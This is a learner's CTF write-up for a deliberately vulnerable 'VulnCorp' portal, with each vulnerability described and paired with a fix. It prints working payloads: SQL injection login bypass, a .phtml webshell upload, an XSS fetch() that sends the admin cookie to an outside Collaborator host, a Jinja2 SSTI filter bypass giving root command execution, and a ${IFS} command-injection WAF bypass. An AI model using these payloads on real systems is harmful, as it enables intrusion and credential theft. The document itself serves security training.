# Day 24 — VulnCorp CTF Full Engagement

Topics: Web Application Penetration Testing, Attack Chaining, CTF, Pentest Report Writing

**Date:** Sunday June 08, 2026

---

## Overview

Full-day CTF engagement on the VulnCorp Internal Portal (v2.4.1) at `54.242.138.150`. Started from zero knowledge and achieved complete server compromise — all 13 flags captured. Submitted a professional penetration test report PDF as the final deliverable.

**Target:** VulnCorp Internal Portal v2.4.1 (port 80, nginx) + HR Portal v3.2.1 (port 3000, Next.js)  
**Backend:** Python Flask 2.3, SQLite  
**Test type:** Black box  
**Outcome:** 13/13 flags, CRITICAL overall risk rating

---

## Attack Chain Summary

```
01 Passive Recon       → HTTP headers (flag), robots.txt (flag)
02 Port Scan           → Discovered port 3000 (HR Portal / Next.js)
03 IDOR                → Enumerated /api/user/1..30, alice's notes (flag)
04 Mass Assignment     → POST /profile role=admin → admin document (flag)
05 SQL Injection       → alice'-- auth bypass → approved session
06 File Upload Bypass  → shell.phtml via Burp intercept (flag)
07 Stored XSS          → fetch() payload → admin cookie stolen via Collaborator (flag)
08 SSTI → RCE          → '__cla'+'ss__' sandbox bypass → subprocess.Popen → root shell (flag)
09 Command Injection   → $() + ${IFS} WAF bypass → diagnostics endpoint (flag)
10 Admin Takeover      → /api/set-admin-session?secret=botSecret123 (flag)
```

---

## Flags Captured

| # | Flag | Vector | Severity |
|---|---|---|---|
| 1 | `FLAG{p4ss1v3_r3c0n_m3t4d4t4_l34k}` | X-Debug-Token HTTP header | INFO |
| 2 | `FLAG{r3c0n_m4st3r_r0b0ts_txt}` | robots.txt comment | LOW |
| 3 | `FLAG{1d0r_ch4mp_acc3ss_d3n13d_lol}` | IDOR /api/user/2 | HIGH |
| 4 | `FLAG{br0k3n_4cc3ss_c0ntr01_0wn3d}` | Mass Assignment /profile | CRITICAL |
| 5 | `FLAG{sql1_4uth_byp4ss_pwn3d}` | SQLi auth bypass | CRITICAL |
| 6 | `FLAG{f1l3_upl04d_w3bsh3ll_dr0pp3d}` | File upload bypass (.phtml) | HIGH |
| 7 | `FLAG{x55_st0r3d_c00k13_st013n}` | Stored XSS → admin cookie theft | HIGH |
| 8 | `FLAG{5st1_t3mpl4t3_1nj3ct10n_rce}` | SSTI sandbox escape → RCE as root | CRITICAL |
| 9 | `FLAG{rce_full_pwn_y0u_0wn_th3_b0x}` | Command injection WAF bypass | CRITICAL |
| 10–13 | (HR Portal flags) | Additional findings via port 3000 | — |

---

## Technical Findings Walkthrough

### VULN-001 — Sensitive Data in HTTP Headers (INFO)

Every HTTP response included `X-Debug-Token` with the flag, and `X-Powered-By: VulnCorp-Portal/2.4.1 Flask/2.3`. HTML source comments exposed developer email and build info.

**Why it matters:** Passive recon gives attacker the stack immediately. Accelerates targeted attacks against known Flask/Python CVEs.

**Fix:** Strip all debug headers from production responses. Suppress `X-Powered-By`. Scan for debug artifacts before deployment.

---

### VULN-002 — Information Disclosure via robots.txt (LOW)

`robots.txt` disallowed `/admin`, `/api`, `/backup`, `/internal` and contained a comment with a flag. Also revealed `/admin-old` — a legacy endpoint not properly decommissioned.

**Why it matters:** robots.txt is public. Listing sensitive paths defeats the purpose of hiding them.

**Fix:** Never list sensitive paths in robots.txt. Properly decommission legacy endpoints with access controls, not just removal from navigation.

---

### VULN-003 — IDOR on User API (HIGH, CVSS 7.5)

`/api/user/<id>` returned full profile data (email, role, notes) for any user ID without checking ownership. Enumerated IDs 1–30 and extracted admin email, roles, and notes fields including flags.

**Payload:**
```
GET /api/user/2
→ {"username": "alice", "notes": "FLAG{1d0r_ch4mp...}", ...}
```

**Fix:** Verify `session.user_id == requested_uid` on every user API endpoint. Admin role required for access to all users.

---

### VULN-004 — Broken Access Control via Mass Assignment (CRITICAL, CVSS 9.1)

`POST /profile` accepted any form parameter and applied it to the user record without filtering. Injecting `role=admin&approved=true` escalated the account to admin.

**Payload (Burp):**
```
POST /profile
bio=test&department=IT&role=admin&approved=true
```

**Fix:** Explicit field whitelist — only accept `bio`, `department`, `template_field` from user input. Role management through a separate admin-only endpoint.

---

### VULN-005 — SQL Injection Auth Bypass (CRITICAL, CVSS 9.8)

Login query built by string interpolation:
```sql
SELECT * FROM users WHERE username = '{username}' AND password = '{password_hash}'
```

Injecting `alice'--` in the username field commented out the password check entirely.

**Payload:**
```
username: alice'--
password: anything
→ Welcome, ALICE (ID: 2)
```

**Fix:** Parameterised queries everywhere:
```python
db.execute('SELECT * FROM users WHERE username=? AND password=?', (username, password_hash))
```

---

### VULN-006 — Unrestricted File Upload (HIGH, CVSS 8.1)

Extension validation was client-side only (JavaScript). Server accepted any filename. Intercepted upload request in Burp and changed `shell.jpg` → `shell.phtml`.

```
Content-Disposition: form-data; name="file"; filename="shell.phtml"
→ "File 'shell.phtml' uploaded successfully"
→ FLAG{f1l3_upl04d_w3bsh3ll_dr0pp3d}
```

**Fix:** Server-side allowlist (png/jpg/gif/pdf/txt only). Validate magic bytes, not just extension. Store uploads outside the web root. Rename to random filenames.

---

### VULN-007 — Stored XSS → Admin Cookie Theft (HIGH, CVSS 7.4)

Feedback stored without sanitisation, rendered as raw HTML on `/admin/feedback`. Admin bot visits periodically. `admin_session` cookie had `HttpOnly=False`.

**Payload submitted to feedback form:**
```javascript
fetch('http://COLLABORATOR.oastify.com/?c='+document.cookie)
```

Burp Collaborator received:
```
GET /?c=admin_session=FLAG{x55_st0r3d_c00k13_st013n};session=...
```

**Fix:** HTML-encode all user content before rendering. Never use `|safe` on untrusted input in Jinja2. Set `HttpOnly=True` on all session cookies. Implement CSP.

---

### VULN-008 — SSTI → RCE as Root (CRITICAL, CVSS 10.0)

`template_field` in the profile was rendered server-side with Jinja2 `Environment` (not `SandboxedEnvironment`). A blocklist filtered dunder strings like `__class__` as static literals. Bypassed by constructing the strings dynamically via concatenation.

**Step 1 — Confirm SSTI:**
```
{{ 7 * 7 }} → 49
```

**Step 2 — Bypass sandbox:**
```jinja
{% set a='__cla'+'ss__' %}
{% set b='__ba'+'se__' %}
{% set c='__subcla'+'sses__' %}
{{ ''|attr(a)|attr(b)|attr(c)() }}
```

**Step 3 — Find subprocess.Popen and execute:**
```jinja
{{ x('id',shell=True,stdout=-1).communicate() }}
→ uid=0(root) gid=0(root) groups=0(root)
```

**Step 4 — Read flag:**
```jinja
{{ x('cat /app/flags/ssti_flag.txt',shell=True,stdout=-1).communicate() }}
→ FLAG{5st1_t3mpl4t3_1nj3ct10n_rce}
```

**The key insight:** The blocklist checked for `__class__` as a *static string*. Building it at runtime (`'__cla'+'ss__'`) produces the same string but bypasses the check completely. Static string filtering is not a sandbox.

**Fix:** Use `SandboxedEnvironment`. Better: eliminate user-controlled template rendering entirely. Use a logic-less engine (Mustache/Handlebars). Run app as non-root.

---

### VULN-009 — OS Command Injection + WAF Bypass (CRITICAL, CVSS 9.8)

Diagnostics endpoint: `cmd = f'ping -c 2 {host}'`. WAF blocked `;`, `|`, `&`, backtick, and commands like `cat`, `bash`, `curl`. Did not block `$()` subshell syntax or `${IFS}` for spaces.

**Payload:**
```
host: 127.0.0.1$(grep${IFS}rce_full${IFS}/app/app.py)
```

ping tried to resolve the grep output as a hostname:
```
ping: "FLAG{rce_full_pwn_y0u_0wn_th3_b0x}": Name or service not known
```

**The key insight:** WAF bypass via `${IFS}` substitutes the Internal Field Separator (space by default) and `$()` runs a subshell. Blocklist-based WAFs will always have gaps — allowlist is the only reliable approach.

**Fix:** `subprocess.run(['ping', '-c', '2', host], capture_output=True)` — no shell, no injection. Allowlist host input to `[a-zA-Z0-9.\-]` only.

---

### VULN-010 — Hardcoded Bot Secret (HIGH, CVSS 8.8)

`/api/set-admin-session?secret=botSecret123` grants full admin session if the secret matches `BOT_SECRET` env var. Default fallback value `botSecret123` was hardcoded in source and not overridden in production.

Found via SSTI RCE reading `/app/app.py`:
```python
if secret == os.environ.get('BOT_SECRET', 'botSecret123'):
```

Navigating to the URL with the hardcoded secret gave full admin session instantly.

**Fix:** Remove the endpoint from production. If needed for testing, use a separate environment. Never hardcode secrets with default fallback values. Use a secrets manager or fail securely if the env var is missing.

---

## Additional Post-Exploitation Findings

- **Flask secret key exposed:** `supersecretkey_vulncorp_2024` — can forge any session cookie with `flask-unsign`
- **Admin password cracked:** MD5 hash `5f4dcc3b5aa765d61d8327deb882cf99` = `password` — MD5 is broken, no salt
- **Internal SSH credentials in document:** `DOC-004` contained `ssh root@10.10.10.1 pass=r00t_v4ult` — enables lateral movement to internal infra
- **Full database dump:** 30+ user records including all MD5 password hashes
- **Full source code extracted:** `/app/app.py` read via SSTI RCE — all secrets, all flags, all architecture

---

## Key Lessons

**On attack chaining:** Each vulnerability alone might be rated medium. Chained together they produce CRITICAL. IDOR gave the admin email → Mass Assignment gave admin role → SQLi gave an approved session → XSS stole the real admin cookie → SSTI gave root shell. Understanding how vulns connect is more important than knowing them in isolation.

**On static string filtering as a "sandbox":** VULN-008 is a perfect example of why blocklist-based security fails. The server was checking for `__class__` as a literal string. Building it at runtime produces the identical string after Python evaluates it — the "filter" never saw it. The only real fix is `SandboxedEnvironment` or removing user-controlled template rendering entirely.

**On WAF bypass:** Blocklists always have gaps. `${IFS}` and `$()` are standard shell features that aren't "dangerous commands" in the traditional sense — they just enable injection. An allowlist (only allow what you know is safe) is the only approach that scales.

**On hardcoded secrets:** The bot secret existed because a developer needed to simulate admin browsing for the XSS challenge. A reasonable requirement, implemented insecurely. The lesson: testing infrastructure must never bleed into production code.

---

## Deliverable

Submitted a full professional penetration test report PDF following the PTES framework. Report included: Executive Summary, Scope & Methodology, Attack Chain Overview, 10 Technical Findings with CVSS scores and PoC steps, Additional Critical Findings section, Flag Summary table, and Remediation Tracker.
